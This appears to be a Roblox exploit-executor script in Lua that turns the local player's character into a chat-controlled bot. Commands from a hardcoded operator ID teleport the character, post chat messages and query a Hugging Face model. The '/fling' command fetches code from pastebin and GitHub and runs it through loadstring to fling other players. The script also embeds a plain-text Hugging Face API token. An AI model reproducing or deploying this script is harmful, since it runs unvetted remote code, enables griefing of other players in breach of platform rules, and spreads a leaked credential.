local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")

local lPlayer = Players.LocalPlayer

local Ops = {[4089251764] = true}
local skipping = false

local function GetRoot()
	local character = lPlayer.Character
	local hrp = character:WaitForChild("HumanoidRootPart")

	return hrp
end

local function Trim(s)
	return s:match("^%s*(.-)%s*$")
end

local function GetPlayer(query)
	if not query or query == "" then return nil end
	query = query:lower()
	local matches = {}
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Name:lower():find(query, 1, true) or player.DisplayName:lower():find(query, 1, true) then
			table.insert(matches, player)
		end
	end
	if #matches == 1 then
		return matches[1]
	end
	return nil
end



local function Op(speaker, raw)
	if not Ops[speaker.UserId] then return end
	local targetRaw = Trim(raw:sub(5) or "")
	if targetRaw == "" then return end
	if targetRaw:lower() == "all" then
		for _, player in ipairs(Players:GetPlayers()) do
			Ops[player.UserId] = true
		end
		return
	end
	local targetPlayer = GetPlayer(targetRaw)
	if targetPlayer then
		Ops[targetPlayer.UserId] = true
	end
end

local function Deop(speaker, raw)
	if not Ops[speaker.UserId] then return end
	local targetRaw = Trim(raw:sub(7) or "")
	if targetRaw == "" then return end
	if targetRaw:lower() == "all" then
		for _, player in ipairs(Players:GetPlayers()) do
			if player.UserId ~= 4089251764 then
				Ops[player.UserId] = nil
			end
		end
		return
	end
	local targetPlayer = GetPlayer(targetRaw)
	if targetPlayer and targetPlayer.UserId ~= 4089251764 then
		Ops[targetPlayer.UserId] = nil
	end
end



local function Skip(speaker, raw)
	if not Ops[speaker.UserId] then return end
	local numberRaw = Trim(raw:sub(7) or "")

	local hrp = GetRoot()

	local count = tonumber(numberRaw)
	if not count then count = 1 end
	skipping = true
	for i = 1, count do
		if not skipping then break end

		local target = workspace:WaitForChild("LoadedRooms"):WaitForChild("RoomExit")
		hrp.CFrame = target.CFrame

		task.wait(1)
	end
end

local function Stop(speaker)
	if not Ops[speaker.UserId] then return end
	skipping = false
end



local function Bring(speaker, raw)
	if not Ops[speaker.UserId] then return end
	local arg = Trim(raw:sub(8) or "")

	local hrp = GetRoot()

	if arg == "" then
		local targetHrp = speaker.Character:FindFirstChild("HumanoidRootPart")
		if targetHrp then
			hrp.CFrame = targetHrp.CFrame
		end
		return
	end

	local targetPlayer = GetPlayer(arg)
	if not targetPlayer then return end
	local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
	if targetHrp then
		hrp.CFrame = targetHrp.CFrame
	end
end


local function Fling(speaker, raw)
	if not Ops[speaker.UserId] then return end
	local targetRaw = Trim(raw:sub(8) or "")
	if targetRaw == "all" then 
		loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
		return
	end

	local targetPlayer = GetPlayer(targetRaw)
	if targetPlayer then
		getgenv().Target = targetPlayer
		print(targetPlayer)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/1shibainu/Kaboom/refs/heads/main/skidfling"))()
	end
end



local function Safe(speaker, raw)
	if not Ops[speaker.UserId] then return end

	local safePart = workspace:FindFirstChild("SafePart")
	if not safePart then
		safePart = Instance.new("Part")
		safePart.Parent = workspace
		safePart.Name = "SafePart"
		safePart.Size = Vector3.new(10, 3, 10)
		safePart.Position = Vector3.new(0, 10000, 0)
		safePart.Anchored = true
	end

	local root = GetRoot()
	if root then
		local pos = safePart.Position + Vector3.new(0, safePart.Size.Y / 2 + 3, 0)
		root.CFrame = CFrame.new(pos)
	end
end



local function Say(speaker, raw)
	if not Ops[speaker.UserId] then return end
	local textRaw = Trim(raw:sub(2) or "")

	TextChatService.TextChannels.RBXGeneral:SendAsync(textRaw)
end

local function Ver(speaker, raw)
	if not Ops[speaker.UserId] then return end

	TextChatService.TextChannels.RBXGeneral:SendAsync("7")
end

local HF_TOKEN = "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"

local MODEL = "HuggingFaceH4/starchat-beta"
local ENDPOINT = "https://api-inference.huggingface.co/models/" .. MODEL


local function GetAi(prompt)
	local payload = HttpService:JSONEncode({
		inputs = prompt,
		parameters = {
			max_new_tokens = 80,
			temperature = 0.7
		}
	})

	local headers = {
		["Authorization"] = "Bearer " .. HF_TOKEN,
		["Content-Type"] = "application/json"
	}

	local success, response = pcall(function()
		return HttpService:RequestAsync({
			Url = ENDPOINT,
			Method = "POST",
			Headers = headers,
			Body = payload
		})
	end)

	if not success then
		return "Request failed: " .. tostring(response)
	end

	if response.StatusCode ~= 200 then
		return "Request failed: " .. tostring(response.StatusCode)
	end

	local ok, decoded = pcall(function()
		return HttpService:JSONDecode(response.Body)
	end)

	if not ok then
		return "Decode failed: " .. tostring(response.Body)
	end

	if decoded and decoded.generated_text then
		return decoded.generated_text
	end

	if decoded and decoded[1] and decoded[1].generated_text then
		return decoded[1].generated_text
	end

	return "No response text found."
end

local function Geremy(speaker, raw)
	if not Ops[speaker.UserId] then return end

	local textRaw = raw:sub(8)
	if textRaw == "" then return end

	local reply = GetAi(textRaw)

	TextChatService.TextChannels.RBXGeneral:SendAsync("[Geremy] " .. reply)

	print("[Geremy Output] " .. reply)
end


local function PlayerChatted(speaker, message)
	if message == "/stop" then
		Stop(speaker)
		return
	end
	if message:sub(1,5) == "/skip" then
		Skip(speaker, message)
		return
	end
	
	if message:sub(1,4) == "/op " or message == "/op" then
		Op(speaker, message)
		return
	end
	if message:sub(1,6) == "/deop " or message == "/deop" then
		Deop(speaker, message)
		return
	end
	
	if message:sub(1,7) == "/bring " or message == "/bring" then
		Bring(speaker, message)
		return
	end
	
	if message:sub(1,7) == "/fling " then
		Fling(speaker, message)
		return
	end
	
	if message:sub(1,5) == "/safe" then
		Safe(speaker, message)
		return
	end
	
	if message:sub(1,4) == "/ver" then
		Ver(speaker, message)
		return
	end
	if message:sub(1,1) == ";" then
		Say(speaker, message)
		return
	end
	if message:sub(1,7) == "geremy " then
		Geremy(speaker, message)
		return
	end
	
end

local function Loader(player)
	player.Chatted:Connect(function(msg)
		PlayerChatted(player, msg)
	end)
end

for _, player in ipairs(Players:GetPlayers()) do
	Loader(player)
end

Players.PlayerAdded:Connect(Loader)
